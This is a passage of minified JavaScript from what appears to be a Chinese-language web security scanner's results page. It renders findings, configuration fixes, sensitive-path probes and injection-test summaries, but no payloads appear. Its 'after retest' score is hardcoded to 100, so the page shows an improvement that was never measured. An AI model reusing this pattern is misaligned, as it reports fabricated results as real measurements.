class="result-list-item'+(A===0?" active":"")+'" id="finding-list-'+A+'" onclick="selectFinding('+A+`)" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();selectFinding(`+A+');}">',k+='<div class="finding-name">'+E(l.name)+"</div>",k+='<div class="finding-meta"><span class="severity-dot '+K+'"></span><span>'+E(l.level)+'</span><span class="severity-tag '+T+'">'+B+"</span></div>",k+="</div>",x+='<div class="finding-detail'+(A===0?" active":"")+'" id="finding-detail-'+A+'" data-finding-name="'+E(l.name)+'" data-scan-id="'+D+'">',x+='<div class="finding-detail-header">',x+='<span class="finding-level '+J+'">'+E(l.level)+"</span>",x+='<span class="finding-name">'+E(l.name)+"</span>",x+='<span class="finding-priority '+T+'">'+B+"</span>",q&&q.is_false_positive?x+='<span class="fp-badge">已标记为误报</span>':q&&q.is_confirmed&&(x+='<span class="confirmed-badge">已确认</span>'),x+="</div>",x+='<div class="finding-detail-body">',x+='<div class="finding-section"><h4>问题摘要</h4><p>'+E(l.summary)+"</p></div>",x+='<div class="finding-section"><h4>OWASP 分类</h4><p>'+E(l.owasp)+"</p></div>",l.location&&l.location.target&&(x+='<div class="finding-section" style="background:#313335;border:1px solid #555555;"><h4>漏洞定位</h4>',x+='<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:6px">',x+='<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px;font-weight:600">'+E(l.location.target)+"</span>",l.location.detail&&(x+='<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px">'+E(l.location.detail)+"</span>"),x+="</div></div>"),x+='<div class="finding-section"><h4>智能检查</h4><p>'+E(l.ai_advice).replace(/\n/g,"<br>")+"</p></div>",x+='<div class="finding-section"><h4>建议</h4><p>'+E(l.fix)+"</p></div>";let X="";if(l.evidence&&(l.evidence.header&&l.name.indexOf("缺少")===0?X="命中响应头缺失："+l.evidence.header:l.evidence.reason&&(l.name.indexOf("敏感路径")>=0||l.name.indexOf("敏感文件")>=0)?X="命中内容特征："+l.evidence.reason:l.name.indexOf("robots.txt")>=0||l.name.indexOf("Robots")>=0?X="robots.txt 是公开协议文件，仅作为信息项展示":l.evidence.reason&&(X=l.evidence.reason)),X&&(x+='<div style="margin-top:6px;font-size:12px;color:var(--text-lighter);border-top:1px dashed var(--border);padding-top:6px">判断依据：'+E(X)+"</div>"),l.evidence){let le=ri(l.evidence);le?x+='<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px">'+le+"</div></details>":x+='<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px;font-size:12px;color:var(--text-lighter)">无额外技术细节</div></details>'}if(l.fixes&&Object.keys(l.fixes).length>0){let le=l.fixes,xe={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask/FastAPI",spring_boot:"Spring Boot",cloudflare:"Cloudflare"},u=["nginx","apache","express","flask","spring_boot","cloudflare"].filter(function(U){return le[U]&&le[U].length>0});if(u.length>0){let U=A;x+='<div style="margin-top:8px">',x+='<div style="display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap">',u.forEach(function(F,_){let w=_===0;x+=`<button onclick="switchFixPlatform('`+F+`', 'finding-fix-')" id="finding-fix-tab-`+F+'" style="padding:4px 10px;border-radius:2px;border:1px solid '+(w?"var(--primary)":"var(--border)")+";background:"+(w?"var(--primary)":"transparent")+";color:"+(w?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+xe[F]+"</button>"}),x+="</div>",u.forEach(function(F,_){let w=_===0?"block":"none";x+='<div id="finding-fix-content-'+F+'" style="display:'+w+'">',le[F].forEach(function(C,W){let Z=typeof C=="string"?C:C.code||"",L=typeof C=="object"&&C.risk_note||"",V="fix-copy-"+F+"-"+W;x+='<div style="position:relative;margin-bottom:6px">',x+='<pre style="background:#2b2b2b;border:1px solid #555555;padding:10px;padding-right:50px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin:0">'+E(Z)+"</pre>",x+=`<button onclick="copyFixCode('`+V+`')" id="`+V+`-btn" aria-label="复制修复代码" style="position:absolute;top:6px;right:6px;padding:6px 12px;min-height:0;background:#45494a;color:#bbbbbb;border:1px solid #555555;border-radius:2px;font-size:12px;font-weight:600;cursor:pointer;transition:background 0.15s" onmouseover="this.style.background='#4b6eaf';this.style.color='#fff'" onmouseout="this.style.background='#45494a';this.style.color='#bbbbbb'">复制</button>`,x+='<textarea id="'+V+'" style="position:absolute;left:-9999px">'+E(Z)+"</textarea>",x+="</div>",L&&(x+='<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:#3d2929;border-radius:2px;margin-bottom:6px">'+E(L)+"</div>")}),x+="</div>"}),x+="</div>"}}if(l.remediation&&(x+='<div class="finding-section"><h4>修复步骤</h4><ul>',(l.remediation.steps||[]).forEach(function(le){x+="<li>"+E(le)+"</li>"}),x+="</ul></div>",l.remediation.nginx&&(x+='<div class="finding-section"><h4>服务器配置</h4><div class="code-block">'+E(l.remediation.nginx)+"</div></div>"),l.remediation.apache&&(x+='<div class="finding-section"><h4>Apache 配置</h4><div class="code-block">'+E(l.remediation.apache)+"</div></div>"),l.remediation.node&&(x+='<div class="finding-section"><h4>Node.js 配置</h4><div class="code-block">'+E(l.remediation.node)+"</div></div>"),l.remediation.verify&&(x+='<div class="finding-section"><h4>验证方法</h4><p>'+E(l.remediation.verify)+"</p></div>")),l.verify_steps&&l.verify_steps.length>0?(x+='<div class="finding-section">',x+="<h4>验证修复（三步验证法）</h4>",x+='<div style="display:flex;flex-direction:column;gap:10px;margin-top:8px">',l.verify_steps.forEach(function(le,xe){let u=["1.","2.","3."][xe]||xe+1+".";x+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:10px 12px;border-left:3px solid var(--success)">',x+='<div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">',x+='<span style="font-size:12px;font-weight:700;color:var(--text-primary)">第 '+(xe+1)+" 步："+E(le.method||"验证")+"</span>",x+="</div>",le.command&&(x+='<div style="font-size:12px;color:var(--text-secondary);margin-bottom:5px">操作：</div>',x+='<pre style="margin:0 0 6px 0;padding:6px 8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">'+E(le.command)+"</pre>"),le.expect&&(x+='<div style="font-size:12px;color:var(--text-secondary);display:flex;align-items:flex-start;gap:4px">',x+='<span style="color:#73c990;font-weight:700;flex-shrink:0">预期：</span>',x+='<span style="color:var(--text-primary)">'+E(le.expect)+"</span>",x+="</div>"),x+="</div>"}),x+="</div>",x+='<div style="margin-top:8px;padding:6px 10px;background:rgba(115,201,144,0.08);border-radius:2px;font-size:12px;color:#15803d;border:1px solid rgba(115,201,144,0.2)">',x+="<strong>提示：</strong>建议按顺序执行三步验证，全部通过后再使用本工具重新扫描确认。",x+="</div>",x+="</div>"):l.verify_method&&(x+='<div class="finding-section"><h4>验证方法</h4><p>'+E(l.verify_method)+"</p></div>"),l.evidence&&Object.keys(l.evidence).length>0){x+='<div style="margin-top:8px;padding:10px;background:var(--bg-secondary);border-radius:2px;font-size:12px">',x+='<div style="font-weight:600;margin-bottom:4px;color:var(--primary)">证据详情</div>';let le=ri(l.evidence);le?x+=le:x+='<div style="color:var(--text-lighter)">无额外技术细节</div>',x+="</div>"}let ge=l.confidence_level||"",re=typeof l.confidence=="number"?l.confidence:null,ae=l.cv_reason||"",oe="finding-confidence";ge==="高"?oe+=" high":ge==="中"?oe+=" medium":ge==="低"?oe+=" low":re!==null&&(re>=80?oe+=" high":re>=60?oe+=" medium":oe+=" low"),x+='<div class="finding-feedback-row" data-finding-name="'+E(l.name)+'" data-scan-id="'+D+'">',x+='<span style="color:var(--text-light)">置信度</span>',ge?x+='<span class="'+oe+'">'+E(ge)+"</span>":re!==null?x+='<span class="'+oe+'">'+re+"%</span>":x+='<span class="'+oe+'">未评估</span>',ae&&(x+='<span style="font-size:12px;color:var(--text-lighter)">· '+E(ae)+"</span>"),(l.review_required||ge==="中")&&(x+='<span style="font-size:11px;background:var(--warning);color:#000;padding:1px 6px;border-radius:2px;margin-left:6px">待复核</span>');let ne=q&&(q.is_false_positive||q.is_confirmed)?" disabled":"";x+=`<button class="finding-feedback-btn btn-confirm" onclick="submitFindingFeedback(this, '`+be(l.name)+"', "+D+', false)" '+ne+">准确</button>",x+=`<button class="finding-feedback-btn btn-fp" onclick="submitFindingFeedback(this, '`+be(l.name)+"', "+D+', true)" '+ne+">误报</button>",q&&q.is_false_positive?x+='<span class="fp-reason-text">已标记为误报，将用于优化后续检测</span>':q&&q.is_confirmed&&(x+='<span class="fp-reason-text" style="color:#73c990">已确认为真实问题，感谢您的反馈</span>'),x+="</div>",x+="</div></div>"}),e.findings&&e.findings.length>0&&(n+='<div class="result-workbench">',n+='<div class="result-list-panel"><div class="result-list-header">发现项（'+e.findings.length+')</div><div class="result-list">'+k+"</div></div>",n+='<div class="result-detail-panel" id="result-detail-panel">'+x+"</div>",n+="</div>"),e.fixes&&Object.keys(e.fixes).length>0){let l=e.fixes,A={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask/FastAPI",spring_boot:"Spring Boot",cloudflare:"Cloudflare"},D=["nginx","apache","express","flask","spring_boot","cloudflare"].filter(function(q){return l[q]&&l[q].length>0});D.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.3s;border:2px solid rgba(115,201,144,0.4);background:#3c3f41,rgba(115,201,144,0.01))">',n+='<div style="font-weight:700;font-size:16px;margin-bottom:10px;color:var(--success)"> 建议（'+D.length+" 种平台）</div>",n+='<div style="display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap">',D.forEach(function(q,$){let te=$===0;n+=`<button onclick="switchFixPlatform('`+q+`')" id="fix-tab-`+q+'" style="padding:6px 14px;border-radius:2px;border:1px solid '+(te?"var(--primary)":"var(--border)")+";background:"+(te?"var(--primary)":"transparent")+";color:"+(te?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+A[q]+"</button>"}),n+="</div>",D.forEach(function(q,$){let te=$===0?"block":"none";n+='<div id="fix-content-'+q+'" style="display:'+te+'">',l[q].forEach(function(B){let T=typeof B=="string"?B:B.code||"",ee=typeof B=="object"&&B.risk_note||"";n+='<pre style="background:var(--bg-secondary);padding:12px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin-bottom:8px">'+E(T)+"</pre>",ee&&(n+='<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:rgba(240,167,50,0.1);border-radius:2px;margin-bottom:8px">'+E(ee)+"</div>")}),n+="</div>"}),n+="</div>")}n+='<div class="gen-fix-section fade-in-up" style="animation-delay:0.4s">',n+="<h3> 一键生成修复配置</h3>",n+='<p class="card-desc" style="margin-bottom:14px">输入您的配置，系统将根据扫描结果生成可直接参考的建议</p>',n+='<div class="gen-fix-row">',n+='<input type="text" id="gen-fix-input" placeholder="粘贴配置或输入 server 块..." />',n+='<button class="gen-fix-btn" onclick="generateFixFromResult()"> 生成</button>',n+="</div>",n+='<div id="gen-fix-output"></div>',n+="</div>";let I=Math.min(100,112);if(n+='<div class="score-compare fade-in-up" style="animation-delay:0.45s">',n+="<h3> 复测后评分对比</h3>",n+='<div class="score-rings">',n+='<div class="score-ring-item">',n+='<div class="ring" style="background:'+Pt(e.score)+'">',n+='<div class="val" style="color:#fff">'+e.score+"</div>",n+='<div class="lbl" style="color:rgba(255,255,255,0.7)">复测前</div>',n+="</div>",n+='<div class="tag">复测前</div>',n+="</div>",n+='<div class="score-ring-item">',n+='<div class="ring" id="score-after-ring" style="background:'+Pt(I)+'">',n+='<div class="val" style="color:#fff">'+I+"</div>",n+='<div class="lbl" style="color:rgba(255,255,255,0.7)">复测后</div>',n+="</div>",n+='<div class="tag">复测后</div>',n+="</div>",n+="</div>",n+='<div class="score-improve" id="score-diff"> 提升 <strong>'+(I-e.score)+"</strong> 分 <span>（"+e.score+" -> "+I+"）</span></div>",n+='<div class="score-rules"><p>评分规则：基础 100 分 - 高风险(18) - 中风险(10) - 低风险(4) + 修复配置(+12) + PR修复(+10)</p></div>',n+="</div>",e.ssl_info&&e.ssl_info.has_cert){n+='<div class="card fade-in-up" style="animation-delay:0.32s">',n+='<div class="card-title"> SSL 证书信息</div>';let l=e.ssl_info;n+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px">',n+='<div><span style="color:var(--text-lighter)">域名:</span> '+E(l.subject||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">签发机构:</span> '+E(l.issuer||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">TLS 版本:</span> '+E(l.version||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">密码套件:</span> '+E(l.cipher||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">剩余天数:</span> '+(l.days_left!=null?l.days_left+" 天":"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">过期时间:</span> '+E(l.not_after||"N/A")+"</div>",l.san&&l.san.length>0&&(n+='<div style="grid-column:1/-1"><span style="color:var(--text-lighter)">SAN:</span> '+E(l.san.join(", "))+"</div>"),n+="</div>",l.expired?n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(199,84,80,0.1);border-radius:2px;color:var(--danger);font-size:12px;font-weight:600">证书已过期！</div>':l.days_left!=null&&l.days_left<30&&(n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">证书将在 '+l.days_left+" 天后过期</div>"),l.weak&&(n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">使用弱加密协议/套件</div>'),n+="</div>"}if(e.waf&&e.waf.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.34s">',n+='<div class="card-title"> WAF 防护检测</div>',n+='<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px">',e.waf.forEach(function(l){n+='<span style="display:inline-flex;align-items:center;gap:4px;padding:4px 10px;background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);border-radius:2px;font-size:12px;font-weight:600">'+E(l.name)+"</span>"}),n+="</div>",n+='<div style="padding:8px 12px;background:rgba(59,130,246,0.06);border-radius:2px;font-size:12px;color:var(--text-light);line-height:1.5">',n+="WAF 提供应用层防护，但不能替代 HSTS、CSP、Cookie 安全策略等配置。下方发现的缺失项仍需修复。",n+="</div>",n+="</div>"),e.sensitive_paths&&e.sensitive_paths.length>0){let l=e.sensitive_paths.filter(function(q){return q.exposed}),A=e.sensitive_paths.filter(function(q){return q.suspect}),J=e.sensitive_paths.filter(function(q){return q.info}),D=e.sensitive_paths.filter(function(q){return!q.exposed&&!q.suspect&&!q.info});n+='<div class="card fade-in-up" style="animation-delay:0.36s">',n+='<div class="card-title"> 敏感路径探测</div>',l.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:var(--danger);margin-bottom:6px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;border-left:3px solid var(--danger)"> 确认漏洞 ('+l.length+")</div>",n+='<div style="font-size:12px;line-height:2">',l.forEach(function(q){n+='<div style="color:var(--danger)">'+E(q.path)+' <span style="color:var(--text-lighter)">['+q.status+"]</span>  已暴露 ("+(q.size||"-")+" bytes)</div>"}),n+="</div></div>"),A.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:var(--warning);margin-bottom:6px;padding:4px 8px;background:rgba(240,167,50,0.08);border-radius:2px;border-left:3px solid var(--warning)">疑似风险 ('+A.length+")</div>",n+='<div style="font-size:12px;line-height:2">',A.forEach(function(q){n+='<div style="color:var(--warning)">'+E(q.path)+' <span style="color:var(--text-lighter)">['+q.status+"]</span> "+E(q.reason||"疑似误报，需复核")+"</div>"}),n+="</div></div>"),J.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:#4b6eaf;margin-bottom:6px;padding:4px 8px;background:rgba(59,130,246,0.08);border-radius:2px;border-left:3px solid #4b6eaf">信息： 公开信息 ('+J.length+")</div>",n+='<div style="font-size:12px;line-height:2">',J.forEach(function(q){n+='<div style="color:#4b6eaf">'+E(q.path)+' <span style="color:var(--text-lighter)">['+q.status+"]</span> 信息： 公开信息</div>"}),n+="</div></div>"),D.length>0&&(n+='<div style="font-size:12px;line-height:2">',D.forEach(function(q){q.protected?n+='<div style="color:var(--success)">'+E(q.path)+' <span style="color:var(--text-lighter)">['+q.status+"]</span>  已保护</div>":n+='<div style="color:var(--text-lighter)">'+E(q.path)+' <span style="color:var(--text-lighter)">['+q.status+"]</span></div>"}),n+="</div>"),n+="</div>"}if(e.crawled_pages&&e.crawled_pages.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.38s">',n+='<div class="card-title"> 爬取页面 ('+e.crawled_pages.length+" 页)</div>",n+='<div style="font-size:12px;line-height:2;max-height:200px;overflow-y:auto">',e.crawled_pages.forEach(function(l){n+='<div style="display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid var(--border-light)">',n+='<span style="color:'+(l.status===200?"var(--success)":"var(--warning)")+';font-weight:600;min-width:30px">['+l.status+"]</span>",n+='<span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+E(l.url)+'">'+E(l.url)+"</span>",l.forms>0&&(n+='<span style="color:var(--warning);font-size:12px">'+l.forms+" 表单</span>"),l.inputs>0&&(n+='<span style="color:var(--primary);font-size:12px">'+l.inputs+" 输入框</span>"),n+="</div>"}),n+="</div></div>"),e.vuln_tests&&e.vuln_tests.length>0){let l=e.vuln_tests.filter(function(J){return J.vulnerable}).length,A=e.vuln_tests.length;n+='<div class="card fade-in-up" style="animation-delay:0.40s">',n+='<div class="card-title"> 参数与表单验证</div>',n+='<div style="display:flex;gap:12px;margin-bottom:10px;font-size:13px">',n+='<span style="color:var(--text-secondary)">检测项总数: <strong>'+A+"</strong></span>",n+='<span style="color:'+(l>0?"var(--danger)":"var(--success)")+'">发现漏洞: <strong>'+l+"</strong></span>",n+="</div>",n+='<div style="font-size:12px;line-height:1.8;max-height:180px;overflow-y:auto">',e.vuln_tests.forEach(function(J){let D=J.vulnerable?"var(--danger)":"var(--text-lighter)",q=(J.vulnerable,"");n+='<div style="color:'+D+';padding:2px 0">',n+=q+" ["+J.type+"] "+E(J.param)+"="+E(J.payload)+" ("+E(J.url.substring(0,50))+"...)</div>"}),n+="</div></div>"}e.scan_type==="deep"&&(n+='<div style="text-align:center;margin:12px 0">',n+='<span style="display:inline-block;padding:4px 14px;background:rgba(75,110,175,0.1);color:var(--primary);border-radius:2px;font-size:12px;font-weight:600">深度扫描模式 - 含参数与表单验证</span>',n+="</div>");let z=e.findings.filter(function(l){return l.owasp==="A05 安全配置错误"||l.owasp==="A02 加密机制失效"||l.name.indexOf("缺少")===0});z.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.42s">',n+='<div class="card-title"> 一键生成修复配置</div>',n+='<p style="font-size:13px;color:var(--text-secondary);margin-bottom:10px">检测到 '+z.length+" 个配置类问题，可自动生成 Nginx 修复配置。</p>",n+='<div class="fixer-btns">',n+='<button class="fixer-btn primary" onclick="goToFixerWithScanResult()"> 生成修复配置</button>',n+='<div class="report-download-dropdown">',n+='<button class="pdf-download-btn" onclick="toggleReportDropdown()"> 下载报告 <span style="font-size:11px">▼</span></button>',n+='<div class="report-dropdown-menu" id="report-dropdown">',n+=`<div onclick="downloadReport('pdf');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background='var(--bg-secondary)'" onmouseout="this.style.background='transparent'">`,n+='<span>PDF</span><span>PDF 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">适合打印存档</span>',n+="</div>",n+=`<div onclick="downloadReport('html');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background='var(--bg-secondary)'" onmouseout="this.style.background='transparent'">`,n+='<span>HTML</span><span>HTML 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">精美可交互</span>',n+="</div>",n+="</div></div>",n+='<button class="fixer-btn success" id="verify-fix-btn" onclick="verifyFix()"> 验证修复效果</button>',n+="</div>",n+="</div>"),n+='<div class="card fade-in-up" style="animation-delay:0.7s;background:#3c3f41,rgba(115,201,144,0.02));border:1px solid rgba(115,201,144,0.2);text-align:center">',n+='<h3 class="card-title" style="color:var(--success)"> 扫描完成</h3>',n+='<p style="color:var(--text-secondary);margin-bottom:16px">将修复配置应用到服务器后，点击下方按钮重新扫描验证效果</p>',n+='<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">',n+='<button class="btn btn-primary" onclick="verifyFix()"> 验证修复效果</button>',n+='<button class="btn btn-secondary" onclick="shareResult()"> 分享报告</button>',n+=`<button class="btn btn-secondary" onclick="downloadReport('pdf')"> 下载 PDF</button>`,n+="</div>",n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">',n+='<div class="card-title"> PDF 报告内容说明</div>',n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">',n+="<div> <strong>风险摘要</strong>：确认漏洞数 / 疑似风险数 / 配置缺失数总览</div>",n+="<div> <strong>证据详情</strong>：每个 finding 的响应头值、敏感路径内容片段、WAF 检测依据</div>",n+="<div> <strong>建议</strong>：按服务器类型（Nginx、Apache、Express、Flask、Spring Boot、Cloudflare）分类的修复配置，含优先级排序</div>",n+="<div> <strong>复测结果</strong>：上次 vs 本次分数对比、新增问题、已修复问题列表</div>",n+="<div> <strong>评分变化</strong>：如有历史记录，展示分数变化趋势</div>",n+="</div>",n+='<div style="margin-top:10px;text-align:center">',n+=`<button class="btn btn-primary" onclick="downloadReport('pdf')"> 下载 PDF 报告</button>`,n+="</div>",n+="</div>";let R=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.exposed}).length:0,O=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.suspect}).length:0,j=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.info}).length:0,P=e.findings?e.findings.filter(function(l){return l.name.indexOf("缺少")===0}).length:0,N=e.findings?e.findings.filter(function(l){return l.type==="config"&&l.name.indexOf("缺少")!==0}).length:0,Y=[];if(R>0?Y.push("发现 "+R+" 个确认级敏感文件泄露"):Y.push("未发现确认级敏感文件泄露"),O>0&&Y.push("检测到 "+O+" 个疑似 WAF/登录页响应"),P>0||N>0){let l=P+N;Y.push("另有 "+l+" 项安全响应头/配置缺失")}let S=Y.join("，")+"。";n+='<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">',n+='<div class="card-title"> 扫描总评</div>',n+='<div style="font-size:14px;line-height:1.8;font-weight:500">'+E(S)+"</div>",n+='<div style="margin-top:10px;font-size:12px;line-height:2">',R>0&&(n+='<div style="color:var(--danger)"> 确认漏洞：'+R+" 个敏感文件可直接访问，需立即修复</div>"),O>0&&(n+='<div style="color:var(--warning)">疑似风险：'+O+" 个路径返回 200，但内容命中 WAF/登录页/反爬特征，因此不判定为真实泄露，待复核</div>"),j>0&&(n+='<div style="color:var(--primary)">信息： 公开信息：'+j+" 个路径为公开协议文件（如 robots.txt），仅作为信息项展示</div>"),P>0&&(n+='<div style="color:var(--text-secondary)">&#x2022; 配置缺失：'+P+" 个安全响应头未配置</div>"),n+="</div>",e.restricted?(n+='<div style="margin-top:10px;padding:8px 12px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;line-height:1.6">',n+="<strong>受限扫描提示</strong><br/>",n+="目标存在 WAF / CDN / 登录 / 反爬限制，可能影响结果完整性。建议优先扫主域名，必要时先完成验证。",n+="</div>"):R===0&&O===0&&(P>0||N>0)&&(n+='<div style="margin-top:10px;padding:8px 12px;background:rgba(115,201,144,0.08);border-radius:2px;color:var(--success);font-size:12px">',n+=" 未发现敏感文件泄露，整体风险可控。建议优先补充缺失的安全响应头以提升评分。",n+="</div>"),n+="</div>",(function(){let l="",A="",J=!1,D="",q="",$=!1,te="",B="",T=!1,ee=e.findings.some(function(ne){return ne.type==="exposed"||ne.name&&ne.name.indexOf("敏感路径")>=0}),K=e.findings.some(function(ne){return ne.severity==="high"&&ne.name&&(ne.name.indexOf("HSTS")>=0||ne.name.indexOf("CSP")>=0)}),X=e.findings.some(function(ne){return(ne.severity==="medium"||ne.severity==="low")&&ne.type==="config"}),ge=e.findings.some(function(ne){return ne.name&&ne.name.indexOf("Server")>=0}),re=e.findings.filter(function(ne){return ne.severity==="high"&&ne.name&&ne.name.indexOf("缺少")===0}),ae=e.findings.filter(function(ne){return(ne.severity==="medium"||ne.severity==="low")&&ne.name&&ne.name.indexOf("缺少")===0});if(ee?(l="修复 exposed 敏感路径（限制 .env/.git 等文件访问）",A="预计提升 20 分",J=!1):K?(l="修复 high severity 响应头缺失（CSP / HSTS）",A="预计提升 15 分",J=!1):(l="无紧急暴露路径，响应头配置良好",A="保持当前状态",J=!0),X||ge||ae.length>0){let ne=[];ae.length>0&&ne.push("补充 "+ae.length+" 个 medium/low 响应头"),ge&&ne.push("隐藏 Server 版本信息"),D=ne.join(" + ")||"检查并优化配置项",q="预计提升 8 分",$=!1}else D="medium/low 配置已完善，Server 信息已隐藏",q="无需操作",$=!0;te="生成修复配置后重新扫描，确认分数提升",B="验证闭环",T=J&&$;let oe=function(ne){return ne?'<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 已完成</span>':'<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 未开始</span>'};n+='<div class="card fade-in-up" style="animation-delay:0.75s;background:#3c3f41,rgba(16,185,129,0.04));border:1px solid rgba(115,201,144,0.2)">',n+='<div class="card-title"> 修复优先级路线</div>',n+='<div style="display:flex;flex-direction:column;gap:10px">',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">1. 第一步（立即）</strong>',n+=oe(J),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+l+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+A+"</div>",n+="</div>",n+='<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">2. 第二步（今天）</strong>',n+=oe($),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+D+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+q+"</div>",n+="</div>",n+='<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">3. 第三步（复测）</strong>',n+=oe(T),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+te+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+B+"</div>",n+="</div>",n+="</div></div>"})(),n+='<div style="margin-top:20px;padding:16px;background:var(--bg-secondary);border-radius:2px;font-size:12px;color:var(--text-secondary)">',n+='<div style="font-weight:600;margin-bottom:8px">检测范围说明</div>',n+="<div>本次体检覆盖：HTTPS/TLS 配置、安全响应头（HSTS/CSP/X-Frame-Options 等 15+ 项）、Cookie 安全属性、CORS 策略、敏感路径暴露、登录态与重定向风险、弱口令与限流策略、XSS / SQL 注入 / SSRF 线索识别、WAF 识别。</div>",n+='<div style="margin-top:4px">不进行：破坏性攻击、主动利用、授权外目标测试和深度渗透动作。</div>',n+='<div style="margin-top:4px;color:var(--text-light)">如需全面安全评估，建议配合专业安全服务。</div>',n+='<div style="margin-top:8px;font-weight:600">如何验证结果</div>',n+="<div>每个发现项都附有请求、响应、命中签名和摘要信息。你可以先看证据，再结合二次扫描结果和原始响应确认；复测后重新扫描，对比评分和证据变化即可验证效果。</div>",n+='<div style="margin-top:8px;font-weight:600">证据分层</div>',n+="<div>“已确认”表示证据充分；“可疑”表示建议复核；“待复核”表示命中线索较弱，需人工再看一眼。</div>",n+='<div style="margin-top:8px;font-weight:600">审计范围</div>',n+="<div>本报告覆盖 HTTP/TLS 配置、安全响应头、Cookie 标记、CORS、敏感路径、登录态/重定向线索、基础注入线索和 WAF 识别，不包含破坏性利用或深度渗透动作。</div>",n+='<div 